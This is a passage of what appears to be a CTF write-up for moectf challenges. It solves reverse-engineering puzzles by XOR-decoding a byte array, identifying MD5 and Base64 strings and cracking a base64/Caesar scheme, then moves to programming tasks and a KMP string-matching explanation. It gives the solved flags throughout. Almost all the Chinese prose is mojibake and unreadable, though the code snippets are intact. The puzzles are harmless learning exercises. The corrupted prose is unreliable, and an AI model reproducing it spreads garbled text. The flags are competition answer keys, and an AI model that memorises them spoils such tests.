<p>æœ¬ä»¥ä¸ºæ˜¯é‚£äº›å¸¸ç”¨çš„ç¼–ç çš„decode, ç»“æœå‘ç°æ ¹æœ¬æ²¡æœ‰è¿™äº›å­—ä¸²&hellip;äºæ˜¯, æˆ‘æƒ³åˆ°äº†<code>Moe RE</code>&hellip;</p>
<p>å…ˆæ‰¾åˆ°äº†<code>byte_404080</code>, åœ¨é•¿ä¸‹é¢è¿™æ ·:</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">.data:404080 byte_404080     db 74h, 22h, 28h, 2Eh, 39h, 2Bh, 36h, 3Ah, 7Dh, 3Ah, 12h
.data:404080                                         ; DATA XREF: sub_401270+8â†‘o
.data:404080                                         ; sub_401360+96â†‘r ...
.data:404080                 db 3Eh, 39h, 3Fh, 12h, 9, 79h, 2Eh, 7Dh, 29h, 7Eh, 12h
.data:404080                 db 7Ch, 3Eh, 12h, 28h, 79h, 3Eh, 34h, 30h, 4Dh
</code></pre><p>æŒ‰ç…§<code>MoeRE</code>çš„æ€æƒ³, æˆ‘æƒ³ç€æ‰¾ä¸ªæ•°æ¥æŒ¨ä¸ªå¼‚æˆ–ä¸€ä¸‹è¯•è¯•..ç„¶åå†™äº†ä¸ªå°ç¨‹åº:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">v404080</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x4D</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">77</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%x&#34;</span><span class="p">,</span> <span class="n">v404080</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ç¬¬ä¸€æ¬¡è¯•çš„æ—¶å€™, <code>key</code>ç”¨çš„æ˜¯ <code>a1</code> çš„ <code>109</code> , ç„¶åå‘ç°ä¸å¯¹&hellip;? åæ¥çœ‹äº†ä¸€çœ¼<code>main</code>é‡Œé¢çš„<code>v4~v9</code>, æ„Ÿè§‰å¤ªå¤§çš„æ•°æ€ä¹ˆä¹Ÿä¸å¯èƒ½å½“<code>key</code>, å°±æ‹¿<code>77</code>è¯•äº†è¯•&hellip; ç„¶åè¿è¡Œäº†ä¸‹<code>flag</code>å°±å‡ºæ¥äº†&hellip;?</p>
<h3 id="algorithm-task">Algorithm Task</h3>
<p>è¿™é“é¢˜ä¸€çœ‹æ–‡ä»¶åå«hardå°±çŸ¥é“è‚¯å®šä¸ç®€å•&hellip;</p>
<p>æ‰”è¿›<code>IDA</code>, ç„¶åçœ‹åˆ°äº†ä¸€å‰¯å®ä¼Ÿå£®è§‚çš„ç¨‹åºè·³è½¬ç”»é¢â€¦â€¦</p>
<p>æœæ–­æ‰¾åˆ°<code>main</code>å‡½æ•°æŒ‰F5, ç„¶åçœ‹è§äº†<code>Decompiling</code>çª—å£å¡äº†åŠå¤©, æœ€åå‡ºæ¥äº†ä¸‹é¢çš„ä»£ç :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 200å¤šä¸ªå˜é‡å£°æ˜ */</span>
</span></span><span class="line"><span class="cl">  <span class="n">v186</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v184</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v187</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v175</span> <span class="o">=</span> <span class="mi">1093207085</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 5ä¸ªåµŒå¥—çš„ while(1) */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">             <span class="cm">/* ä¸€å¤§å †ä¸çŸ¥æ‰€ä»¥çš„è®¡ç®—è¿‡ç¨‹ */</span>
</span></span><span class="line"><span class="cl">             <span class="cm">/* è¿˜æœ‰ä»¨Wrong Flagçš„åˆ¤å®š */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v175</span> <span class="o">==</span> <span class="o">-</span><span class="mi">866985480</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">a2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="s">&#34;dcba3261b6ef0d77&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v107</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;dcba3261b6ef0d77&#34;</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v108</span> <span class="o">=</span> <span class="mi">1750495256</span><span class="p">;</span> <span class="c1">// æ‰¾åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸², ç›²çŒœæ˜¯MD5åŠ å¯†
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span> <span class="n">v107</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v108</span> <span class="o">=</span> <span class="mi">402522278</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v175</span> <span class="o">=</span> <span class="n">v108</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ä¸€å¤§å †else if,å¹¶ä¸æ˜¯å¾ˆèƒ½çœ‹æ‡‚åœ¨å¹²ä»€ä¹ˆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v175</span> <span class="o">==</span> <span class="mi">184885918</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please input the flag:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> <span class="c1">// ç„¶åçœ‹è§äº†è¾“å…¥
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">a2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%42s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v188</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="s">&#34;moectf{&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s2</span><span class="p">,</span> <span class="mi">7uLL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span><span class="c1">// å‰ç¼€ä¸å‚ä¸
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="cm">/* å¦ä¸€å¤§å †ä¸æ˜æ‰€ä»¥çš„åŠ å¯† */</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v175</span> <span class="o">==</span> <span class="mi">233838060</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">a2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">sub_630390</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v183</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v189</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;X1I0X0YxYWdfWTB1XzRyZV9TdHIwbmd9&#34;</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">a3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* åˆæ˜¯æµ©å¦‚çƒŸæµ·çš„çœ‹ä¸æ‡‚çš„åŠ å¯†è¿‡ç¨‹... */</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>åœ¨æºä»£ç ä¸­çœ‹è§äº†<code>dcba3261b6ef0d77</code>å’Œ<code>X1I0X0YxYWdfWTB1XzRyZV9TdHIwbmd9</code>ä¸¤ä¸²å¯ç–‘çš„ä¸œä¸œ, å‰é¢é‚£ä¸²è¦ä¹ˆæ˜¯<code>MD5</code>è¦ä¹ˆæ˜¯<code>SHA1</code>, åé¢é‚£ä¸²è‚¯å®šæ˜¯<code>Base</code>ç³»åˆ—çš„, æ ¹æ®é¢˜ç›®ç»™çš„ä¿¡æ¯, æœ¬é¢˜ä»…ç”¨äº†ä¸¤ç§å¸¸è§ç®—æ³•, åŸºæœ¬å¯ä»¥ç¡®å®šæŠŠä¿©è§£å‡ºæ¥çš„å­—ç¬¦ä¸²æ‹¼èµ·æ¥å‰é¢åŠ ä¸Š<code>moectf{</code>å°±OKäº†.</p>
<p>åœ¨ç½‘ä¸Šæ‰¾ä¸ªå·¥å…·æˆåŠŸè§£å‡º<code>flag</code>: <code>moectf{enj0y_R4_F1ag_Y0u_4re_Str0ng}</code></p>
<h3 id="easy-c">Easy C++</h3>
<p>ç”±äºå¾—åˆ°äº†æˆ‘å¤§å“¥çš„å¸®åŠ©, æˆ‘ç®—æ˜¯æˆåŠŸçš„è§£å‡ºæ¥äº†è¿™é“é¢˜.. ç”±äºå†™WPçš„ç¯å¢ƒæ¢åˆ°äº†Linux, å°±ç®€å•çš„è®²ä¸€ä¸‹è¿™é“é¢˜çš„æ€è·¯å§..</p>
<p>è¿™é“é¢˜çš„<code>flag</code>: <code>moectf{CPP_BaSE64_CaeS@r_1S_s0_eaaaasy}</code></p>
<p>åšé¢˜æ€è·¯: ç»è¿‡æˆ‘å¤§å“¥<code>Apache553</code>çš„åŠªåŠ›, æŠŠIDAä¸­æ‰€æœ‰çš„å‡½æ•°å…¨éƒ¨è¯†åˆ«äº†å‡ºæ¥, è¿™é“é¢˜æ‰å¾—ä»¥ç ´è§£. ç”¨<code>OllyDebug</code>è°ƒè¯•è¿‡ç¨‹ä¸­æ‰¾åˆ°å­—ç¬¦ä¸²æ¯”è¾ƒçš„å‡½æ•°çš„æ±‡ç¼–ä»£ç ç„¶åè·Ÿè¿›, å¯ä»¥åœ¨å †æ ˆä¸­å‘ç°ä¸€ä¸²base64, åº”è¯¥æ˜¯å¯¹åº”çš„å¯†æ–‡. é€šè¿‡<code>Apache553</code>çš„å·¥ç¨‹æ–‡ä»¶å¤§æ¦‚å¾—çŸ¥è¿™æ˜¯ä½¿ç”¨ç§»ä½çš„æ–¹å¼æ„å»ºäº†ä¸€ä¸ªæ–°çš„<code>table</code>, äºæ˜¯å†™è„šæœ¬å¾ªç¯æ„å»º<code>table</code>, æœ€ç»ˆå°†<code>flag</code>çˆ†ç ´äº†å‡ºæ¥. ( æˆ‘æŒºæƒ³å†™è¯¦ç»†è¿‡ç¨‹çš„, ä½†æ˜¯Windowsæ‰¾ä¸åˆ°æ˜¾å¡äº†å¼€ä¸äº†æœº, å°±åªèƒ½å…ˆå‡‘åˆäº†&hellip; )</p>
<h2 id="programming">Programming</h2>
<h3 id="easy-ppc">Easy PPC</h3>
<p>è¯»äº†ä¸‹é¢˜ç›®ç»™çš„ä»£ç , å¤§æ¦‚æ‡‚äº†æ„æ€ä¹‹å, å†™äº†ä¸€æ®µå°ç¨‹åº, è¯»å–æ–‡ä»¶, ç„¶åæŠŠæ•°å­—æå–å‡ºæ¥:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="n">freopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isdigit</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å¾—åˆ°äº†è¿™ä¹ˆä¸€ä¸²æ•°å­—: <code>109111101991161021231128911610448110957811184956511097994811010064125</code></p>
<p>ç„¶åå·¥å…·äººåŸºå› è§‰é†’, æ‰‹åŠ¨åˆ†ç±», åˆ†æˆ<code>ASCII</code>åº”è¯¥æœ‰çš„æ ·å­:</p>
<p><code>109 111 101 99 116 102 123 112 89 116 104 48 110 95 78 111 84 95 65 110 97 99 48 110 100 64 125</code></p>
<p>ç„¶åå†å†™ä¸€ä¸ªç¨‹åº:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">putchar</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å°±æ˜¯æ— è„‘æŠŠ<code>x</code>å½“æˆ<code>char</code>æ¥è¾“å‡º..</p>
<p>æŠŠåˆšåˆ†å¥½ç±»çš„æ•°å­—ç²˜è´´è¿›å», æœ€åå¾—åˆ°<code>flag</code>: <code>moectf{pYth0n_NoT_Anac0nd@}</code></p>
<h3 id="w1ndç‰›é€¼">w1ndç‰›é€¼ï¼</h3>
<p>æ‹¿åˆ°è¿™é¢˜, é¢æ— è¡¨æƒ…çš„è§£å‹, é¢æ— è¡¨æƒ…çš„ç”¨<code>Visual Studio Code</code>æ‰“å¼€æ–‡ä»¶å¤¹, é¢æ— è¡¨æƒ…çš„ç‚¹å¼€åœ¨æ–‡ä»¶ä¸­æœç´¢, é¢æ— è¡¨æƒ…çš„è¾“å…¥<code>w1ndNiuBi</code>, é¢æ— è¡¨æƒ…çš„æ‰“å¼€å…¨å­—åŒ¹é…çš„å¼€å…³, é¢æ— è¡¨æƒ…çš„æŠŠæ€»æ•°æ‰”è¿›åœ¨çº¿base64ç¼–ç , å¾—åˆ°ç»“æœ<code>moectf{NjMyNA==}</code>, é¢æ— è¡¨æƒ…çš„æäº¤&hellip; ( å¥½æ²¡æ„æ€çš„é¢˜ ( æºœäº†æºœäº†</p>
<h3 id="a-template-problem">A Template Problem</h3>
<p>è¿™ä¸ªé¢˜çœ‹ç€åªæœ‰ä¸€ç™¾åˆ†æˆ‘å´å†™äº†å¥½ä¹…å¥½ä¹…â€¦ ä»¿ä½›åˆå›åˆ°äº†ä»¥å‰å†™NOIPå´æ€ä¹ˆä¹Ÿå†™ä¸å‡ºæ¥åªèƒ½ç™¾åº¦æ±‚åŠ©è€Œå¯¹ç€æ±‚åŠ©æ¥çš„ä»£ç ä¸çŸ¥æ‰€æªçš„å¹´ä»£ğŸ˜­</p>
<p>è¿™é¢˜è¦ç”¨åˆ°KMPç®—æ³•&hellip;ä»€ä¹ˆæ˜¯KMPç®—æ³•å’§? å°±æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„æ¨¡å¼ä¸²åŒ¹é…ç®—æ³•&hellip;</p>
<p>å•¥åˆæ˜¯æ¨¡å¼ä¸²åŒ¹é…?</p>
<p>æ¨¡å¼ä¸²åŒ¹é…, å°±æ˜¯ç»™å®šä¸€ä¸ªéœ€è¦å¤„ç†çš„å­—ç¬¦ä¸² ( ä¼šè¶…çº§è¶…çº§é•¿ ) å’Œä¸€ä¸ªéœ€è¦åœ¨æ–‡æœ¬ä¸²ä¸­æœç´¢çš„æ¨¡å¼ä¸² ( ç†è®ºä¸Šé•¿åº¦åº”è¯¥è¿œè¿œå°äºéœ€è¦å¤„ç†çš„å­—ç¬¦ä¸², å¦åˆ™æ²¡æ³•ç©äº†&hellip; ) , æŸ¥è¯¢åœ¨è¯¥æ–‡æœ¬ä¸²ä¸­, ç»™å‡ºçš„æ¨¡å¼ä¸²æ˜¯å¦å‡ºç°, å‡ºç°çš„æ¬¡æ•°, å‡ºç°çš„ä½ç½®ç­‰ç­‰ç­‰é—®é¢˜.</p>
<p>ä¸ºå•¥è¦å«KMP?</p>
<blockquote>
<p>å› ä¸ºæœ‰ä¸‰ä½ä¼Ÿå¤§çš„ç§‘å­¦å®¶å…±åŒè®¾è®¡å®Œæˆâ€¦â€¦åˆ†åˆ«æ˜¯<code>D.E.Knuth</code> &amp; <code>J.H.Morris</code> &amp; <code>V.R.Pratt</code></p>
</blockquote>
<p>ç„¶è€Œæˆ‘å¹¶ä¸éœ€è¦çŸ¥é“ä»–ä»¬éƒ½æ˜¯è°è°è°&hellip;åªéœ€è¦çŸ¥é“è¿™æ˜¯ä¸ªå¾ˆæµæ‰¹çš„ç®—æ³•å°±å¥½äº†..</p>
<p>ä»æ´›è°·å­¦æ¥çš„:</p>
<blockquote>
<p>é¦–å…ˆè¦ç†è§£ï¼Œæœ´ç´ çš„å•æ¨¡å¼ä¸²åŒ¹é…å¤§æ¦‚å°±æ˜¯æšä¸¾æ¯ä¸€ä¸ªæ–‡æœ¬ä¸²å…ƒç´ ï¼Œç„¶åä»è¿™ä¸€ä½å¼€å§‹ä¸æ–­å‘åæ¯”è¾ƒï¼Œæ¯æ¬¡æ¯”è¾ƒå¤±è´¥ä¹‹åéƒ½è¦ä»å¤´å¼€å§‹é‡æ–°æ¯”å¯¹ï¼Œå¤§æ¦‚æœŸæœ›æ—¶é—´å¤æ‚åº¦åœ¨ Î¸(n+m) å·¦å³ï¼Œå¯¹äºä¸€èˆ¬çš„å¼±æ•°æ®è¿˜æ˜¯é˜”ä»¥è·‘çš„äº†æ»´ã€‚ä½†æ˜¯å…¶å®æ˜¯å¯ä»¥è¢«å¡æˆO(nm)çš„ã€‚emmmmå¹¶ä¸”è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“å¡çš„ã€‚</p>
<p>è€Œ KMPçš„ç²¾é«“åœ¨äºï¼Œå¯¹äºæ¯æ¬¡å¤±é…ä¹‹åï¼Œæˆ‘éƒ½ä¸ä¼šä»å¤´é‡æ–°å¼€å§‹æšä¸¾ï¼Œè€Œæ˜¯æ ¹æ®æˆ‘å·²ç»å¾—çŸ¥çš„æ•°æ®ï¼Œä»æŸä¸ªç‰¹å®šçš„ä½ç½®å¼€å§‹åŒ¹é…ï¼›è€Œå¯¹äºæ¨¡å¼ä¸²çš„æ¯ä¸€ä½ï¼Œéƒ½æœ‰<strong>å”¯ä¸€</strong>çš„â€œç‰¹å®šå˜åŒ–ä½ç½®â€ï¼Œè¿™ä¸ªåœ¨å¤±é…ä¹‹åçš„ç‰¹å®šå˜åŒ–ä½ç½®å¯ä»¥å¸®åŠ©æˆ‘ä»¬åˆ©ç”¨å·²æœ‰çš„æ•°æ®ä¸ç”¨ä»å¤´åŒ¹é…ï¼Œä»è€ŒèŠ‚çº¦æ—¶é—´ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬è€ƒè™‘ä¸€ç»„æ ·ä¾‹ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">æ¨¡å¼ä¸²ï¼š</span><span class="n">abcab</span>
</span></span><span class="line"><span class="cl"><span class="err">æ–‡æœ¬ä¸²ï¼š</span><span class="n">abcacababcab</span>
</span></span></code></pre></div><p>é¦–å…ˆï¼Œå‰å››ä½æŒ‰ä½åŒ¹é…æˆåŠŸï¼Œé‡åˆ°ç¬¬äº”ä½ä¸åŒï¼Œè€Œè¿™æ—¶ï¼Œæˆ‘ä»¬é€‰æ‹©å°†abcabå‘å³ç§»ä¸‰ä½ï¼Œæˆ–è€…å¯ä»¥ç›´æ¥ç†è§£ä¸ºç§»åŠ¨åˆ°æ¨¡å¼ä¸²ä¸­ä¸å¤±é…å­—ç¬¦ç›¸åŒçš„é‚£ä¸€ä½ã€‚å¯ä»¥ç®€å•åœ°ç†è§£ä¸ºï¼Œæˆ‘ä»¬å°†ä¸¤ä¸ªå·²ç»éå†è¿‡çš„æ¨¡å¼ä¸²å­—ç¬¦é‡åˆï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä¸ç”¨ä¸€ä½ä¸€ä½åœ°ç§»åŠ¨ï¼Œè€Œæ˜¯æ ¹æ®ç›¸åŒçš„å­—ç¬¦æ¥å®ç°å¿«é€Ÿç§»åŠ¨ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">æ¨¡å¼ä¸²ï¼š</span>   <span class="n">abcab</span>
</span></span><span class="line"><span class="cl"><span class="err">æ–‡æœ¬ä¸²ï¼š</span><span class="n">abcacababcab</span>
</span></span></code></pre></div><p>ä½†æœ‰æ—¶ä¸å…‰åªä¼šæœ‰å•ä¸ªå­—ç¬¦é‡å¤ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">æ¨¡å¼ä¸²ï¼š</span><span class="n">abcabc</span>
</span></span><span class="line"><span class="cl"><span class="err">æ–‡æœ¬ä¸²ï¼š</span><span class="n">abcabdababcabc</span>
</span></span></code></pre></div><p>å½“æˆ‘ä»¬å‘ç°åœ¨ç¬¬å…­ä½å¤±é…æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ¨¡å¼ä¸²çš„ç¬¬ä¸€äºŒä½ç§»åŠ¨åˆ°ç¬¬å››äº”ä½ï¼Œå› ä¸ºå®ƒä»¬ç›¸åŒ .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">æ¨¡å¼ä¸²ï¼š</span>   <span class="n">abcabc</span>
</span></span><span class="line"><span class="cl"><span class="err">æ–‡æœ¬ä¸²ï¼š</span><span class="n">abcabdababcabc</span>
</span></span></code></pre></div><p>é‚£ä¹ˆç°åœ¨å·²ç»å¾ˆæ˜äº†äº†ï¼Œ KMP çš„é‡å¤´æˆå°±åœ¨äºç”¨å¤±é…æ•°ç»„æ¥ç¡®å®šå½“æŸä¸€ä½å¤±é…æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‰ä¸€ä½è·³è·ƒåˆ°ä¹‹å‰åŒ¹é…è¿‡çš„æŸä¸€ä½ã€‚è€Œæ­¤å¤„æœ‰å‡ ä¸ªå…ˆå†³æ¡ä»¶éœ€è¦ç†è§£ï¼š</p>
<p>1ã€<strong>æˆ‘ä»¬çš„å¤±é…æ•°ç»„åº”å½“å»ºç«‹åœ¨æ¨¡å¼ä¸²æ„ä¹‰ä¸‹ï¼Œè€Œä¸æ˜¯æ–‡æœ¬ä¸²æ„ä¹‰ä¸‹</strong>ã€‚å› ä¸ºæ˜¾ç„¶æ¨¡å¼ä¸²è¦æ›´åŠ çµæ´»ï¼Œåœ¨å¤±é…åæ¢ä½æ—¶ï¼Œæ›´çµæ´»ç®€ä¾¿åœ°å¤„ç†ã€‚</p>
<p>2ã€å¦‚ä½•ç¡®å®šä½ç½®å‘¢ï¼Ÿ</p>
